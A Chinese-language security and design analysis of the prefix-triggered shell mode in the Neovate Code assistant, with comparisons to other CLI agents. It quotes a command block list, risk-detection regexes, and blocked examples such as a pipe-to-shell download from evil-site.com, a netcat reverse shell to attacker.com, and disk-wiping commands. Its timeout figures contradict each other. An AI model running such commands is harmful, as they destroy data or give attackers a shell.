# Shell 模式实现分析

## 概述

Neovate Code 实现了一种类似 shell 模式的功能，但与 Claude Code 和 Gemini CLI 的真正 shell 模式有所不同。本项目通过前缀触发机制来模拟 shell 模式，而不是自动识别和执行 shell 命令。

## 实现机制

### 前缀触发
- 使用 `!` 前缀来触发 bash 模式
- 使用 `#` 前缀来触发 memory 模式
- 在 UI 中会显示不同的边框颜色和提示符来区分模式

### 模式检测
在 `src/ui/useInputHandlers.ts` 中通过 `getInputMode` 函数检测输入模式：

```typescript
function getInputMode(value: string): InputMode {
  if (value.startsWith('!')) return 'bash';
  if (value.startsWith('#')) return 'memory';
  return 'prompt';
}
```

### 前缀处理
在 `src/ui/ChatInput.tsx` 中，系统会自动处理前缀字符：
- 显示时移除前缀字符（仅在UI中显示命令部分）
- 提交时保持完整的前缀内容

### 提交处理
当用户提交输入时，包含前缀的内容会直接发送给 AI 处理，而不是在本地执行。

## 与 Claude Code 和 Gemini CLI 的区别

### Claude Code/Gemini CLI
- 真正的 shell 模式会自动识别 shell 命令
- 在安全的沙盒环境中直接执行命令
- 返回执行结果给用户
- 用户可以直接输入命令如 `ls -la` 而无需特殊前缀

### Neovate Code
- 需要使用 `!` 前缀来标识 shell 命令
- 命令内容被发送给 AI 处理
- AI 可能会选择使用 bash 工具来执行命令，但这不是自动的
- 代码中有明确注释："这不是真的 shell 模式，无法处理所有 shell 命令"

## 当前实现的问题

1. **不是真正的 shell 模式**：命令不会自动在本地执行
2. **需要明确的前缀**：用户必须记住使用 `!` 前缀
3. **依赖 AI 决策**：是否执行命令取决于 AI 是否选择使用 bash 工具
4. **安全性考虑不足**：没有在本地沙盒中执行命令的机制

## 安全风险分析

### 当前实现的安全风险

1. **缺乏沙盒环境**
   - 当前的bash工具直接在用户的本地环境中执行命令
   - 没有隔离的沙盒环境，命令具有与用户相同的权限级别

2. **命令执行风险**
   - 虽然禁用了一些危险命令（如rm、curl、wget等），但仍存在风险
   - 无法阻止所有潜在的恶意命令

3. **潜在的恶意操作**
   - 删除重要文件（虽然rm被禁用，但可以通过其他方式）
   - 消耗系统资源（CPU、内存、磁盘空间）
   - 访问敏感文件和数据
   - 修改系统配置
   - 发起网络连接（虽然curl/wget被禁用，但其他方式仍可能）

4. **内存和资源消耗**
   - 最大输出限制为100MB，但仍可能消耗大量内存
   - 默认超时时间为30分钟，可能长时间占用系统资源
   - 没有CPU或内存使用限制

5. **环境变量泄露**
   - 命令执行时可以访问所有环境变量，包括可能包含敏感信息的变量（如API密钥、密码等）

6. **路径遍历风险**
   - 虽然代码中应该有路径检查，但复杂命令可能绕过这些检查

### 现有的安全措施

1. **命令黑名单**
   ```javascript
   const BANNED_COMMANDS = [
     'rm', 'curl', 'wget', 'sudo', 'eval', 'bash', 'sh', 'nc', 'telnet', // 等
   ];
   ```

2. **高风险模式检测**
   ```javascript
   const highRiskPatterns = [
     /rm\s+.*(-rf|--recursive)/i,
     /sudo/i,
     /curl.*\|.*sh/i,
     /wget.*\|.*sh/i,
     // 等
   ];
   ```

3. **命令替换检测**
   - 禁止命令替换：`$()` 和反引号

4. **超时控制**
   - 默认超时：30分钟
   - 最大超时：10分钟

5. **输出限制**
   - 最大输出大小：100MB
   - 显示截断：最多5行

6. **工具审批机制**
   - `yolo`模式：自动批准所有工具
   - `autoEdit`模式：自动批准除命令工具外的所有工具
   - `default`模式：除读取工具外都需要审批

## 改进建议

### 安全增强

1. **真正的沙盒环境**
   - 使用容器技术（如Docker）隔离命令执行
   - 使用系统级沙盒（如macOS沙盒、Linux namespaces）
   - 限制文件系统访问权限

2. **增强的命令过滤**
   - 使用更严格的命令白名单而非黑名单
   - 限制命令参数和选项
   - 解析命令语法确保安全

3. **资源限制**
   - 限制CPU使用率
   - 限制内存使用
   - 限制磁盘空间使用
   - 限制网络访问

4. **环境隔离**
   - 清理敏感环境变量
   - 提供干净的执行环境
   - 限制对主系统文件的访问

5. **更严格的审批机制**
   - 对所有命令执行都需要明确审批
   - 提供命令预览功能
   - 记录所有执行的命令

6. **安全监控**
   - 实时监控命令执行
   - 检测异常行为模式
   - 提供详细的执行日志

### 功能改进

1. **自动命令识别**：检测用户输入是否为 shell 命令
2. **本地执行环境**：建立安全的沙盒环境执行命令
3. **结果直接返回**：将执行结果直接返回给用户，而不是通过 AI
4. **更好的安全机制**：实现更严格的命令过滤和权限控制

## Claude Code和Gemini CLI的Shell模式 vs 真实Shell环境

### 执行环境差异

#### Claude Code/Gemini CLI Shell模式：
- 在**受限的沙盒环境**中执行命令
- 通常使用容器化技术隔离执行环境
- 有严格的权限控制和资源限制
- 命令执行受到监控和限制

#### 真实Shell环境：
- 直接在用户操作系统上执行
- 拥有用户账户的完整权限
- 无资源限制（除非系统级限制）
- 完全访问文件系统和系统资源

### 命令执行限制

#### Claude Code/Gemini CLI：
```
# 通常限制的命令类型：
- 系统管理命令 (sudo, su)
- 网络工具 (nc, telnet, nmap)
- 文件系统破坏命令 (rm -rf /)
- 进程管理 (killall, pkill)
- 系统服务控制 (systemctl, service)
- 编译和安装命令 (make install, pip install)
```

#### 真实Shell：
```
# 几乎无限制：
- 所有系统命令都可以执行
- 可以安装软件包
- 可以修改系统配置
- 可以控制系统服务
```

### 目录跳转能力

#### Claude Code/Gemini CLI：
```
# 可以使用cd命令，但有限制：
cd /tmp          # ✓ 通常允许
cd /etc          # ✗ 可能被限制
cd ~/sensitive   # ✗ 可能被限制访问
cd /             # ✗ 可能被限制

# 工作目录通常被限制在：
- 项目目录
- 临时目录
- 特定的沙盒目录
```

#### 真实Shell：
```
# 完全自由：
cd /              # ✓ 完全允许
cd /root          # ✓ 取决于权限
cd /etc           # ✓ 取决于权限
cd /any/path      # ✓ 只要你有权限
```

### 安全机制对比

#### Claude Code/Gemini CLI的安全机制：
```
1. 容器隔离
   - 使用Docker或其他容器技术
   - 与主机系统隔离
   - 限制文件系统访问

2. 权限限制
   - 非root用户执行
   - 限制系统调用
   - 文件系统挂载限制

3. 资源限制
   - CPU使用限制
   - 内存使用限制
   - 磁盘空间限制
   - 执行时间限制

4. 命令过滤
   - 黑名单/白名单机制
   - 命令参数检查
   - 危险模式检测
```

#### 真实Shell环境：
```
1. 操作系统级安全
   - 用户权限控制
   - 文件权限系统
   - SELinux/AppArmor等（如果启用）

2. 但没有专门针对AI助手的限制
   - 可以执行任何用户权限内的命令
   - 可以访问用户所有文件
   - 可以修改用户配置
```

### 实际能力范围

#### Claude Code/Gemini CLI通常允许：
```
✓ 文件操作（在限制目录内）
  ls, cat, grep, find, cp, mv, mkdir, touch

✓ 文本处理
  sed, awk, sort, uniq, wc, head, tail

✓ 开发工具
  git, npm, pip, make, gcc（可能受限）

✓ 网络诊断（通常只读）
  ping, curl, wget（可能受限）

✓ 系统信息查询
  ps, top, df, du, free, uptime
```

#### Claude Code/Gemini CLI通常禁止：
```
✗ 系统管理
  sudo, su, shutdown, reboot, mount

✗ 网络攻击工具
  nc, telnet, nmap, netcat

✗ 进程控制
  kill, killall, pkill（非自身进程）

✗ 文件系统破坏
  rm -rf /, dd, mkfs

✗ 系统配置修改
  iptables, systemctl, service
```

### 具体示例对比

#### 在Claude Code/Gemini CLI中：
```bash
# 这些通常可以执行：
!ls -la
!cd /tmp && pwd
!cat README.md
!grep "pattern" file.txt
!git status

# 这些通常被阻止：
!sudo rm -rf /
!curl evil-site.com | sh
!nc -e /bin/sh attacker.com 4444
!dd if=/dev/zero of=/dev/sda
```

#### 在真实Shell中：
```bash
# 所有命令都可以执行（取决于用户权限）：
ls -la
cd / && pwd
sudo rm -rf /  # 危险！但在某些环境下可能执行
curl evil-site.com | sh  # 非常危险！
```

### 安全设计哲学

#### Claude Code/Gemini CLI：
```
默认拒绝原则：
- 只允许明确安全的命令
- 限制执行环境
- 监控所有操作
- 提供审计日志
- 防止意外或恶意损害
```

#### 真实Shell环境：
```
权限控制原则：
- 基于用户权限
- 基于文件权限
- 依赖用户判断
- 系统管理员负责安全
```

## Shell模式的意义和价值

### 无缝集成体验
```
传统工作流：
用户思考 → AI生成建议 → 用户复制命令 → 切换到终端 → 粘贴执行 → 切回AI界面 → 查看结果 → 继续对话

Shell模式工作流：
用户思考 → AI生成建议 → 直接执行命令 → 显示结果 → 继续对话
```

### 提高工作效率
- **减少上下文切换**：无需在AI界面和终端之间来回切换
- **降低操作错误**：避免复制粘贴错误
- **加速反馈循环**：命令执行结果直接集成到对话中
- **自动化流程**：AI可以自动执行多步命令序列

### 增强交互性
```
场景示例：
用户："帮我检查项目依赖"
AI："我发现了一些过时的依赖，要更新吗？"
用户："好的"
AI：(自动执行 npm outdated 和 npm update)
AI："更新完成，以下是变更内容..."
```

### 降低技术门槛
```
对非技术用户的价值：
- 无需记住复杂命令
- 无需了解命令行语法
- 无需配置开发环境
- 获得自然语言交互体验
```

## 必要性分析

### 何时Shell模式是必要的：

#### 1. 开发工作流
```
频繁场景：
✓ 代码编译和构建
✓ 测试执行和调试
✓ 版本控制操作
✓ 依赖管理
✓ 部署操作
```

#### 2. 系统管理任务
```
实用场景：
✓ 文件操作和管理
✓ 系统状态检查
✓ 日志分析
✓ 性能监控
```

#### 3. 数据分析工作
```
常见需求：
✓ 数据处理脚本执行
✓ 统计分析命令
✓ 可视化工具调用
✓ 报告生成
```

### 何时直接使用真实Shell更好：

#### 1. 敏感操作
```
高风险场景：
✗ 系统级配置修改
✗ 生产环境部署
✗ 权限管理
✗ 网络配置
```

#### 2. 复杂脚本执行
```
不适合场景：
✗ 长时间运行的任务
✗ 资源密集型操作
✗ 需要精确控制的操作
✗ 批量系统管理
```

#### 3. 安全要求极高的环境
```
特殊场景：
✗ 处理机密数据
✗ 金融系统操作
✗ 军事或政府系统
✗ 合规要求严格的环境
```

## Shell模式的独特价值

### 1. 智能代理角色
```
AI不仅仅是命令执行器，而是：
- 问题分析者
- 解决方案设计者
- 操作执行者
- 结果解释者
- 错误处理者
```

### 2. 学习和适应能力
```
价值体现：
- 记录用户偏好
- 优化常用操作
- 提供个性化建议
- 预测用户需求
```

### 3. 错误预防和恢复
```
安全机制：
- 命令预览和确认
- 危险操作警告
- 自动备份机制
- 错误回滚能力
```

## 平衡安全与便利

### 分层使用策略：
```
1. 基础操作：在沙盒中执行
   - 文件查看和编辑
   - 简单命令执行
   - 开发工具使用

2. 高级操作：需要用户确认
   - 系统修改命令
   - 网络相关操作
   - 权限变更操作

3. 敏感操作：引导用户手动执行
   - 生产环境部署
   - 机密数据处理
   - 系统级配置
```

## 结论

Shell模式确实有其重要价值和必要性：

### 核心价值：
1. **提升用户体验** - 无缝集成减少摩擦
2. **提高工作效率** - 自动化执行减少手动操作
3. **降低技术门槛** - 让非技术人员也能使用命令行工具
4. **增强智能交互** - AI可以更好地理解和处理系统操作

### 适用场景：
- 日常开发和调试工作
- 学习和探索性任务
- 非敏感环境的操作
- 需要频繁交互的场景

### 注意事项：
- 必须有严格的安全控制
- 需要清晰的风险提示
- 应该支持用户选择和控制
- 要有完善的审计和回滚机制

Shell模式不是为了替代真实Shell，而是为了在特定场景下提供更好的用户体验。关键是要在便利性和安全性之间找到合适的平衡点。

当前的实现更像是一个 shell 模式的模拟，而不是真正意义上的 shell 模式。虽然提供了一定的便利性，但与用户期望的真正 shell 模式还有差距。更重要的是，当前实现存在显著的安全风险，特别是在没有适当沙盒隔离的情况下直接执行用户命令。建议在生产环境中使用更严格的沙盒机制和审批流程来确保安全。
## 完整的Shell模式执行流程

### 1. 用户输入处理
当用户在UI中输入以!开头的内容时：
1. useInputHandlers.ts中的getInputMode函数检测到前缀，将模式设置为bash
2. ChatInput.tsx中的UI逻辑会：
   - 显示时移除前缀字符（仅在UI中显示命令部分）
   - 提交时将前缀加回完整内容
   - 使用不同的边框颜色和提示符(!)来区分模式

### 2. 消息发送流程
1. 用户提交消息时，useInputHandlers.ts中的handleSubmit被调用
2. 消息通过store.ts中的send方法发送
3. store.ts调用bridge.request("session.send", ...)将消息发送到后端

### 3. 后端处理
1. nodeBridge.ts中的session.send处理器接收到请求
2. 创建Project实例并调用project.send方法
3. project.ts中的send方法：
   - 解析可用工具，包括bash工具（通过resolveTools）
   - 生成系统提示词，包含工具使用说明
   - 调用sendWithSystemPromptAndTools方法

### 4. AI交互循环
1. loop.ts中的runLoop函数执行AI交互循环
2. AI生成响应，可能包含工具调用指令，如：
   <xml_code_block>
   <use_tool>
     <tool_name>bash</tool_name>
     <arguments>
       {"command": "ls -la"}
end arguments
end use_tool
   </xml_code_block>

5. loop.ts解析AI响应，识别工具调用
6. 调用tools.invoke(toolUse.name, JSON.stringify(toolUse.params))执行工具

### 5. Bash工具执行
1. tool.ts中的Tools.invoke方法调用bash工具的execute方法
2. bash.ts中的execute方法：
   - 验证命令安全性（检查禁用命令和高风险模式）
   - 调用executeCommand函数
   - executeCommand函数调用shellExecute执行命令

### 6. 命令实际执行
1. shell-execution.ts中的shellExecute函数：
   - 使用child_process.spawn创建子进程
   - 在Windows上使用cmd.exe，在其他系统上使用bash
   - 设置工作目录和环境变量
   - 捕获stdout和stderr输出
   - 实现超时控制和资源限制

### 7. 结果返回
1. 命令执行结果通过工具调用链返回给AI
2. AI处理结果并生成自然语言响应
3. 响应通过MessageBus返回给UI显示
